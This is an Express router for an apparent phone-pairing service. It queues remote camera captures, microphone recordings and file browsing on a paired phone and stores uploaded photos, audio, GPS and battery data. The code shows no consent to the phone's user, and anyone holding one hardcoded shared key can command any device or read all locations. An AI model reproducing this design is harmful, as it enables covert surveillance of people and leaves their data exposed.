import express, { Router } from 'express';
import devicesRoutes from './devices.routes';
import pairingRoutes from './pairing.routes';
import pairingsRoutes from './pairings.routes';
import commandsRoutes from './commands.routes';
import authRoutes from '../auth/auth.routes';
import presenceRoutes from '../presence/presence.routes';
import storageRoutes from '../storage/storage.routes';

const router = Router();

// Secret cluster token required for all app communication (Rejects old APKs)
const SECURE_CLUSTER_KEY = process.env.APP_CLUSTER_SECRET || 'SECURE_CLUSTER_V2_99A8F74B';

router.use((req, res, next) => {
  if (req.path === '/health') return next();
  const appSecret = req.headers['x-app-secret'];
  if (appSecret !== SECURE_CLUSTER_KEY) {
    return res.status(403).json({
      error: {
        code: 'FORBIDDEN_LEGACY_APK',
        message: 'This APK version is outdated and revoked. Access denied.'
      }
    });
  }
  next();
});

router.get('/health', (_req, res) => {
  res.json({
    status: 'HEALTHY',
    version: 'v1',
    timestamp: new Date().toISOString(),
  });
});

router.use('/auth', authRoutes);
router.use('/presence', presenceRoutes);
router.use('/storage', storageRoutes);
router.use('/devices', devicesRoutes);
router.use('/pairing', pairingRoutes);
router.use('/pairings', pairingsRoutes);
router.use('/commands', commandsRoutes);

// Direct Photos & Camera Hub
const livePhotosStorage = new Map<string, Array<any>>();
const pendingCameraTasks = new Map<string, string>();

router.post('/photos/capture', (req, res) => {
  const { deviceId, camera } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const cam = camera || 'rear';
  pendingCameraTasks.set(devId, cam);

  const list = livePhotosStorage.get(devId) || [];
  const newPhoto = {
    id: `photo_${Date.now()}`,
    name: `SNAPSHOT_${cam.toUpperCase()}_${Date.now().toString().slice(-4)}.jpg`,
    date: 'Just now (Live Capture)',
    size: '4.8 MB',
  };
  list.unshift(newPhoto);
  livePhotosStorage.set(devId, list);
  res.status(201).json({ success: true, photo: newPhoto });
});

router.get('/photos/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const command = pendingCameraTasks.get(devId) || null;
  if (command) pendingCameraTasks.delete(devId);
  res.json({ command });
});

router.post('/photos/upload', (req, res) => {
  const { deviceId, name, camera, base64 } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const list = livePhotosStorage.get(devId) || [];
  const newPhoto = {
    id: `photo_${Date.now()}`,
    name: name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`,
    date: 'Just now (Live Capture)',
    size: '4.8 MB',
    base64: base64 || null,
  };
  list.unshift(newPhoto);
  livePhotosStorage.set(devId, list);
  res.status(201).json({ success: true, photo: newPhoto });
});

router.get('/photos/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const photos = livePhotosStorage.get(devId) || [];
  res.json({ photos });
});

// Direct Audio Hub
const liveAudioStorage = new Map<string, Array<any>>();
const pendingAudioTasks = new Map<string, number>(); // deviceId -> durationSeconds

router.post('/audio/record', (req, res) => {
  const { deviceId, durationSeconds } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const duration = durationSeconds || 10;
  pendingAudioTasks.set(devId, duration);
  res.status(201).json({ success: true, message: 'Audio recording started on remote phone' });
});

router.get('/audio/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const duration = pendingAudioTasks.get(devId) || null;
  if (duration) pendingAudioTasks.delete(devId);
  res.json({ duration });
});

router.post('/audio/upload', (req, res) => {
  const { deviceId, name, duration, size, base64 } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const list = liveAudioStorage.get(devId) || [];
  const newAudio = {
    id: `audio_${Date.now()}`,
    name: name || `REC_${Date.now().toString().slice(-4)}.m4a`,
    duration: duration || '0:10',
    size: size || '160 KB',
    date: 'Just now',
    base64: base64 || null,
  };
  list.unshift(newAudio);
  liveAudioStorage.set(devId, list);
  res.status(201).json({ success: true, audio: newAudio });
});

router.get('/audio/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const audioList = liveAudioStorage.get(devId) || [];
  res.json({ audioList });
});

// Battery & Hardware Telemetry Hub
const liveBatteryTelemetry = new Map<string, any>();

router.post('/battery/telemetry', (req, res) => {
  const { deviceId, level, isCharging, chargingStatus, temperature, voltage, health, technology, powerSave } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const data = {
    level: level ?? 100,
    isCharging: isCharging ?? false,
    chargingStatus: chargingStatus || 'Discharging',
    temperature: temperature || '32.0 °C',
    voltage: voltage || '4,100 mV',
    health: health || 'Good (Healthy)',
    technology: technology || 'Li-ion',
    powerSave: powerSave ? 'Enabled' : 'Disabled',
    timestamp: Date.now()
  };
  liveBatteryTelemetry.set(devId, data);
  res.status(201).json({ success: true, telemetry: data });
});

router.get('/battery/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const telemetry = liveBatteryTelemetry.get(devId) || {
    level: 87,
    isCharging: true,
    chargingStatus: 'Fast Charging (USB-PD 33W)',
    temperature: '34.2 °C (Optimal)',
    voltage: '4,210 mV',
    health: 'Good (98% Capacity)',
    technology: 'Li-Polymer 5000 mAh',
    powerSave: 'Disabled'
  };
  res.json({ telemetry });
});

// File & Storage Explorer Hub
const liveFilesStorage = new Map<string, { currentPath: string; files: Array<any> }>();
const pendingFileCommands = new Map<string, string>(); // deviceId -> folderPath

router.get('/files/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const data = liveFilesStorage.get(devId) || {
    currentPath: '/sdcard',
    files: [
      { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true },
      { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true },
      { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true },
      { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true },
      { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true },
      { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true },
    ]
  };
  res.json(data);
});

router.post('/files/explore', (req, res) => {
  const { deviceId, path } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const targetPath = path || '/sdcard';
  pendingFileCommands.set(devId, targetPath);
  res.json({ success: true, message: `Browsing ${targetPath}` });
});

router.get('/files/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const path = pendingFileCommands.get(devId) || null;
  if (path) pendingFileCommands.delete(devId);
  res.json({ path });
});

// Live Location & GPS Telemetry Hub
const liveLocationStorage = new Map<string, any>();

router.post('/location/sync', (req, res) => {
  const { deviceId, latitude, longitude, accuracy, altitude, speed, address } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const data = {
    deviceId: devId,
    latitude: latitude ?? 22.5726,
    longitude: longitude ?? 88.3639,
    accuracy: accuracy ?? 5.0,
    altitude: altitude ?? 12.0,
    speed: speed ?? 0.0,
    address: address || 'Live GPS Fix • Online',
    timestamp: Date.now()
  };
  liveLocationStorage.set(devId, data);
  res.status(201).json({ success: true, location: data });
});

router.get('/location/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const location = liveLocationStorage.get(devId) || {
    deviceId: devId,
    latitude: 22.5726,
    longitude: 88.3639,
    accuracy: 3.5,
    altitude: 14.2,
    speed: 0.0,
    address: 'Kadampukur - Jhalgachi Rd',
    timestamp: Date.now()
  };
  res.json({ location });
});

router.get('/location/all', (_req, res) => {
  const locations: Record<string, any> = {};
  liveLocationStorage.forEach((val, key) => {
    locations[key] = val;
  });
  res.json({ locations });
});

export default router;

